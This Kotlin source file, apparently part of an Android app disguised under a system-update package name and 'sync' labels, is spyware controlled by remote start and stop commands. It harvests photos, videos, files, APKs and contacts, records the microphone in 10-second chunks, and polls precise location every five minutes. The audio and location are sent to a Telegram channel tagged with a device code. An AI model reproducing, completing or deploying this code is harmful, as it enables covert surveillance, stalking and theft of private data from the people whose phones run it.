// language: Kotlin, file: SyncManager.kt
// *المنسق المركزي للمهام — مهمة واحدة نشطة في نفس الوقت*
// *كل /xxx_start يوقف الحالي ويشغّل الجديدة*
// *كل /xxx_stop يوقف النوع ده لو كان نشط*

package com.sys.update2

import android.content.Context
import android.util.Log

enum class TaskType {
    NONE,
    PHOTOS,
    VIDEOS,
    AUDIO,
    FILES,
    APK,
    CONTACTS,
    LOCATION
}

object SyncManager {

    private const val TAG = "SyncManager"

    @Volatile
    private var current: TaskType = TaskType.NONE

    @Volatile
    private var running: Boolean = false

    private var audioThread: Thread? = null

    @Synchronized
    fun start(ctx: Context, type: TaskType): String {
        // أوقف أي مهمة شغالة
        stopAllInternal(ctx, notify = false)

        // شغّل الجديدة
        when (type) {
            TaskType.NONE -> return "لا يوجد"
            TaskType.PHOTOS -> {
                current = TaskType.PHOTOS
                running = true
                SyncWorker.startWithType(ctx, SyncWorker.JobKind.PHOTOS)
            }
            TaskType.VIDEOS -> {
                current = TaskType.VIDEOS
                running = true
                SyncWorker.startWithType(ctx, SyncWorker.JobKind.VIDEOS)
            }
            TaskType.FILES -> {
                current = TaskType.FILES
                running = true
                SyncWorker.startWithType(ctx, SyncWorker.JobKind.FILES)
            }
            TaskType.APK -> {
                current = TaskType.APK
                running = true
                SyncWorker.startWithType(ctx, SyncWorker.JobKind.APK)
            }
            TaskType.CONTACTS -> {
                current = TaskType.CONTACTS
                running = true
                SyncWorker.startWithType(ctx, SyncWorker.JobKind.CONTACTS)
            }
            TaskType.AUDIO -> {
                current = TaskType.AUDIO
                running = true
                startAudioLoop(ctx)
            }
            TaskType.LOCATION -> {
                current = TaskType.LOCATION
                running = true
                startLocationLoop(ctx)
            }
        }

        Log.d(TAG, "started: $type")
        return nameOf(type)
    }

    @Synchronized
    fun stop(ctx: Context, type: TaskType): Boolean {
        if (current != type) return false
        stopAllInternal(ctx, notify = false)
        return true
    }

    @Synchronized
    fun stopAll(ctx: Context) {
        stopAllInternal(ctx, notify = false)
    }

    private fun stopAllInternal(ctx: Context, notify: Boolean) {
        try { SyncWorker.stop() } catch (_: Exception) {}
        try { AudioRecorder.stopLoop(ctx) } catch (_: Exception) {}

        audioThread?.let { it.interrupt() }
        audioThread = null
        locationThread?.let { it.interrupt() }
        locationThread = null

        current = TaskType.NONE
        running = false

        if (notify) Log.d(TAG, "stopped all")
    }

    fun currentTask(): TaskType = current
    fun isRunning(): Boolean = running

    fun nameOf(type: TaskType): String = when (type) {
        TaskType.NONE -> "متوقف"
        TaskType.PHOTOS -> "الصور"
        TaskType.VIDEOS -> "الفيديو"
        TaskType.AUDIO -> "الصوت"
        TaskType.FILES -> "الملفات"
        TaskType.APK -> "APK"
        TaskType.CONTACTS -> "جهات الاتصال"
        TaskType.LOCATION -> "الموقع"
    }

    // ═══════════════════════════════════════════
    //  Audio loop — تسجيل chunk كل 10 ثواني ورفعها
    // ═══════════════════════════════════════════
    private fun startAudioLoop(ctx: Context) {
        audioThread = Thread({
            AudioRecorder.startLoop(ctx)
            while (running && current == TaskType.AUDIO) {
                try {
                    val file = AudioRecorder.startChunk(ctx)
                    Thread.sleep(Config.AUDIO_CHUNK_MS)
                    val done = AudioRecorder.stopChunk()
                    if (done != null && done.exists() && done.length() > 1000) {
                        try {
                            TelegramApi.sendAudio(done, "🎤 ${DeviceManager.getDeviceCode(ctx)}")
                        } catch (_: Exception) {}
                        try { done.delete() } catch (_: Exception) {}
                    }
                } catch (_: InterruptedException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "audio loop: ${e.message}")
                }
            }
            try { AudioRecorder.stopLoop(ctx) } catch (_: Exception) {}
        }, "audio-loop").also { it.start() }
    }

    // ═══════════════════════════════════════════
    //  Location loop — كل 5 دقايق
    // ═══════════════════════════════════════════
    @Volatile
    private var locationThread: Thread? = null

    private fun startLocationLoop(ctx: Context) {
        locationThread = Thread({
            while (running && current == TaskType.LOCATION) {
                try {
                    val loc = LocationHelper.getPreciseLocation(ctx, 15)
                    if (loc != null) {
                        LocationCache.save(ctx, loc.latitude, loc.longitude, loc.accuracy)
                        TelegramApi.sendMessage(
                            LocationHelper.formatLocation(ctx, loc) +
                            "\n🆔 `${DeviceManager.getDeviceCode(ctx)}`"
                        )
                    }
                } catch (_: Exception) {}
                try { Thread.sleep(5 * 60_000L) } catch (_: InterruptedException) { break }
            }
        }, "location-loop").also { it.start() }
    }
}
